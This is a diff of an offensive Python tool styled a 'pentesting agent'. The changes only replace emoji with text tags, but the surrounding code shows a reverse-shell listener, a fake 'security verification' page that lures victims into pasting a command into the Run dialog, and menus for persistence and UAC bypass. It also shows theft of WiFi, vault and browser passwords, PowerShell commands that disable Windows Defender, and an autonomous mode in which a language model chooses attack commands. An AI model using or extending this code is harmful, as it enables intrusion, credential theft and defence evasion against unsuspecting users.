@@ -135,7 +135,7 @@ def ask_ai_streaming(prompt, max_tokens=500):
             stream=True,
             timeout=300
         )
-        console.print("[bold magenta]💭 AI Thinking (live):[/]")
+        console.print("[bold magenta][THOUGHT] AI Thinking (live):[/]")
         for line in response.iter_lines():
             if line:
                 try:
@@ -177,7 +177,7 @@ COMMAND:"""
 
 def autonomous_mode():
     """Run AI-powered autonomous attack loop."""
-    console.print(Panel("[bold cyan]🤖 AI AUTONOMOUS MODE[/]\nDeepSeek Coder 6.7B will decide what to do next.\nPress Ctrl+C to stop.", border_style="cyan"))
+    console.print(Panel("[bold cyan][AI] AI AUTONOMOUS MODE[/]\nDeepSeek Coder 6.7B will decide what to do next.\nPress Ctrl+C to stop.", border_style="cyan"))
     
     state = AgentState()
     max_iterations = 30
@@ -190,7 +190,7 @@ def autonomous_mode():
             last_output = state.command_history[-1]["output"] if state.command_history else ""
             
             # 2. Ask AI for next command
-            console.print(f"\n[dim]🧠 Thinking... (iteration {state.iteration}/{max_iterations})[/]")
+            console.print(f"\n[dim][BRAIN] Thinking... (iteration {state.iteration}/{max_iterations})[/]")
             prompt = build_ai_prompt(state, last_output)
             ai_response = ask_ai(prompt)
             
@@ -238,7 +238,7 @@ def autonomous_mode():
 def ai_assistant_mode():
     """Interactive AI assistant - you tell it what to do in natural language."""
     console.print(Panel(
-        "[bold cyan]🤖 AI ASSISTANT MODE[/]\n"
+        "[bold cyan][AI] AI ASSISTANT MODE[/]\n"
         "Tell the AI what you want to do in plain English.\n"
         "Example: 'find all wifi passwords' or 'list files in downloads'\n"
         "Type 'exit' to return to menu.",
@@ -268,7 +268,7 @@ POWERSHELL COMMAND:"""
             
             # Show the prompt being sent
             print()
-            console.print(Panel(f"[bold]Your request:[/] {user_request}", title="🧠 Understanding Request", border_style="blue"))
+            console.print(Panel(f"[bold]Your request:[/] {user_request}", title="[BRAIN] Understanding Request", border_style="blue"))
             print()
             
             # USE STREAMING for live token display
@@ -401,7 +401,7 @@ class ShellManager:
                 if attempt_port != port:
                     console.print(f"[yellow]Port {port} busy, using {attempt_port}[/]")
                 CFG.listener_port = attempt_port
-                console.print(f"[green]✓ TLS Listener on port {attempt_port}[/]")
+                console.print(f"[green][OK] TLS Listener on port {attempt_port}[/]")
                 return
             except OSError:
                 if raw_sock:
@@ -471,7 +471,7 @@ class ShellManager:
                     
                     if response.lower() == expected.lower():
                         self.connected = True
-                        console.print(f"[bold green]✓ AUTHENTICATED SHELL from {self.addr[0]}![/]")
+                        console.print(f"[bold green][OK] AUTHENTICATED SHELL from {self.addr[0]}![/]")
                         # Read initial prompt
                         try:
                             initial = self.conn.recv(4096).decode(errors='ignore')
@@ -515,7 +515,7 @@ class ShellManager:
             self.conn = new_conn
             self.addr = new_addr
             self.connected = True
-            console.print(f"[bold green]✓ NEW SHELL from {new_addr[0]}![/]")
+            console.print(f"[bold green][OK] NEW SHELL from {new_addr[0]}![/]")
             # Read initial prompt
             self.conn.settimeout(2)
             try:
@@ -744,16 +744,16 @@ p{{color:#ccc;font-size:14px}}
 </head>
 <body>
 <div class="box">
-<h2>⚠️ Security Verification Required</h2>
+<h2>[WARN] Security Verification Required</h2>
 <p>Copy the command below and run it to complete verification.</p>
 
 <div class="cmd-box" id="cmdBox">{one_liner}</div>
 
-<button class="btn" onclick="copyCmd()">📋 Copy Command</button>
-<div class="success" id="success">✓ Copied! Now run it.</div>
+<button class="btn" onclick="copyCmd()">[CLIP] Copy Command</button>
+<div class="success" id="success">[OK] Copied! Now run it.</div>
 
 <div class="instructions">
-<strong>📋 Instructions:</strong>
+<strong>[CLIP] Instructions:</strong>
 <ol>
 <li>Click <strong>Copy Command</strong> above</li>
 <li>Press <strong>Win + R</strong> (opens Run dialog)</li>
@@ -771,7 +771,7 @@ function copyCmd() {{
     document.getElementById('cmdText').select();
     document.execCommand('copy');
     document.getElementById('success').style.display = 'block';
-    document.querySelector('.btn').innerText = '✓ Copied!';
+    document.querySelector('.btn').innerText = '[OK] Copied!';
     document.querySelector('.btn').style.background = '#0b8043';
 }}
 </script>
@@ -867,7 +867,7 @@ def menu_persistence():
     """Persistence submenu."""
     while True:
         os.system('clear')
-        choice = show_menu("🔐 PERSISTENCE", [
+        choice = show_menu("[LOCK] PERSISTENCE", [
             ("1", "Startup Folder"),
             ("2", "Registry Run Key"),
             ("3", "Scheduled Task (needs admin)"),
@@ -958,7 +958,7 @@ def menu_steal_data():
     """Data theft submenu."""
     while True:
         os.system('clear')
-        choice = show_menu("🔑 STEAL DATA", [
+        choice = show_menu("[KEY] STEAL DATA", [
             ("1", "WiFi Passwords"),
             ("2", "Windows Vault Credentials"),
             ("3", "Browser Passwords (Chrome/Edge)"),
@@ -981,7 +981,7 @@ def menu_steal_data():
             loot_file = os.path.join(loot_dir, f"wifi_{SHELL.addr[0] if SHELL.addr else 'unknown'}.txt")
             with open(loot_file, 'w') as f:
                 f.write(result)
-            console.print(f"[bold green]✓ Saved to YOUR machine: {loot_file}[/]")
+            console.print(f"[bold green][OK] Saved to YOUR machine: {loot_file}[/]")
             input("\n[Enter to continue]")
         elif choice == "2":
             cmd = 'cmdkey /list'
@@ -994,7 +994,7 @@ def menu_steal_data():
             loot_file = os.path.join(loot_dir, f"vault_{SHELL.addr[0] if SHELL.addr else 'unknown'}.txt")
             with open(loot_file, 'w') as f:
                 f.write(result)
-            console.print(f"[bold green]✓ Saved to YOUR machine: {loot_file}[/]")
+            console.print(f"[bold green][OK] Saved to YOUR machine: {loot_file}[/]")
             input("\n[Enter to continue]")
         elif choice == "3":
             # ============================================================
@@ -1150,7 +1150,7 @@ foreach ($b in $browsers) {{
                             except: pass
                         conn.close()
                         if count > 0:
-                            console.print(f"[green]✓ Decrypted {count} passwords from {browser_name}[/]")
+                            console.print(f"[green][OK] Decrypted {count} passwords from {browser_name}[/]")
                         os.remove(temp_db_path)
                     
                 except Exception as e:
@@ -1161,7 +1161,7 @@ foreach ($b in $browsers) {{
                 with open(loot_file, 'w') as f:
                     f.write(final_results)
                 console.print(Panel(final_results, title="[green]Decrypted Passwords[/]"))
-                console.print(f"[bold green]✓ Saved to: {loot_file}[/]")
+                console.print(f"[bold green][OK] Saved to: {loot_file}[/]")
             elif not found_data:
                 console.print("[red]No data received via upload. Blocked by firewall?[/]")
                 
@@ -1231,13 +1231,13 @@ def menu_privesc():
     """Privilege escalation submenu."""
     while True:
         os.system('clear')
-        choice = show_menu("⬆️ PRIVILEGE ESCALATION", [
+        choice = show_menu("[UP] PRIVILEGE ESCALATION", [
             ("1", "Check Current Privileges"),
             ("2", "UAC Bypass (eventvwr - stealthier)"),
             ("3", "UAC Bypass (computerdefaults)"),
             ("4", "Fake Defender Prompt + Request Admin"),
-            ("5", "🛡️ Disable Defender (needs admin)"),
-            ("6", "🛡️ Add Exclusion Path (needs admin)"),
+            ("5", "[SHIELD] Disable Defender (needs admin)"),
+            ("6", "[SHIELD] Add Exclusion Path (needs admin)"),
             ("7", "Check Defender Status"),
             ("0", "← Back"),
         ])
@@ -1305,7 +1305,7 @@ objShell.Run "powershell -w hidden -ep bypass -c Start-Process powershell -Verb 
         elif choice == "5":
             # Disable Defender (requires admin)
             console.print("[cyan]Attempting to disable Windows Defender...[/]")
-            console.print("[yellow]⚠️ This REQUIRES admin privileges![/]")
+            console.print("[yellow][WARN] This REQUIRES admin privileges![/]")
             cmd = 'Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPreference -DisableIOAVProtection $true; Set-MpPreference -DisableBehaviorMonitoring $true; echo "Defender disabled (if admin)!"'
             result = SHELL.execute(cmd)
             console.print(Panel(result, title="[green]Disable Defender Result[/]"))
@@ -1313,7 +1313,7 @@ objShell.Run "powershell -w hidden -ep bypass -c Start-Process powershell -Verb 
         elif choice == "6":
             # Add exclusion path
             console.print("[cyan]Adding exclusion paths to Defender...[/]")
-            console.print("[yellow]⚠️ This REQUIRES admin privileges![/]")
+            console.print("[yellow][WARN] This REQUIRES admin privileges![/]")
             cmd = 'Add-MpPreference -ExclusionPath "C:\\"; Add-MpPreference -ExclusionPath "$env:TEMP"; Add-MpPreference -ExclusionProcess "powershell.exe"; echo "Exclusions added (if admin)!"'
             result = SHELL.execute(cmd)
             console.print(Panel(result, title="[green]Add Exclusion Result[/]"))
@@ -1347,19 +1347,19 @@ def post_exploitation_menu():
         os.system('clear')
         
         # Check if shell is still connected
-        status = "[bold green]✓ Connected[/]" if SHELL.connected else "[bold red]✗ Disconnected[/]"
+        status = "[bold green][OK] Connected[/]" if SHELL.connected else "[bold red]✗ Disconnected[/]"
         console.print(Panel(f"{status}\n[dim]Target: {SHELL.addr[0] if SHELL.addr else 'N/A'}[/]", 
-                           title="🎯 ACTIVE SESSION", border_style="green" if SHELL.connected else "red"))
+                           title="[TARGET] ACTIVE SESSION", border_style="green" if SHELL.connected else "red"))
         
         choice = show_menu("What do you want to do?", [
-            ("1", "🔐 Install Persistence"),
-            ("2", "🔑 Steal Data"),
-            ("3", "⬆️  Privilege Escalation"),
-            ("4", "💻 Raw Shell (manual commands)"),
-            ("5", "🔄 Wait for Reconnect"),
-            ("6", "🤖 AI Autonomous Mode"),
-            ("7", "💬 AI Assistant (tell it what to do)"),
-            ("0", "❌ Exit"),
+            ("1", "[LOCK] Install Persistence"),
+            ("2", "[KEY] Steal Data"),
+            ("3", "[UP]  Privilege Escalation"),
+            ("4", "[PC] Raw Shell (manual commands)"),
+            ("5", "[SYNC] Wait for Reconnect"),
+            ("6", "[AI] AI Autonomous Mode"),
+            ("7", "[CHAT] AI Assistant (tell it what to do)"),
+            ("0", "[X] Exit"),
         ])
         
         if choice == "0":
@@ -1390,7 +1390,7 @@ def main():
     
     banner = """
     ╔═══════════════════════════════════════════════════════════════╗
-    ║        🎯 HYBRID PENTESTING AGENT 🎯                          ║
+    ║        [TARGET] HYBRID PENTESTING AGENT [TARGET]                          ║
     ║   ───────────────────────────────────────────────────         ║
     ║   Phase 1: Auto-serve link → Shell connects                   ║
     ║   Phase 2: Menu appears → You control everything              ║
@@ -1406,7 +1406,7 @@ def main():
     # Phase 1: Start servers
     console.print("[cyan]Starting HTTP server...[/]")
     start_http_server()
-    console.print(f"[green]✓ HTTP server on port {CFG.http_port}[/]")
+    console.print(f"[green][OK] HTTP server on port {CFG.http_port}[/]")
     
     console.print("[cyan]Starting listener...[/]")
     SHELL.start_listener(CFG.listener_port)
@@ -1417,7 +1417,7 @@ def main():
 [bold white]http://{ip}:{CFG.http_port}/[/]
 
 Waiting for shell connection...
-""", title="🎣 PHASE 1: GET SHELL", border_style="yellow"))
+""", title="[HOOK] PHASE 1: GET SHELL", border_style="yellow"))
     
     # Wait for shell
     if SHELL.wait_for_connection(timeout=600):
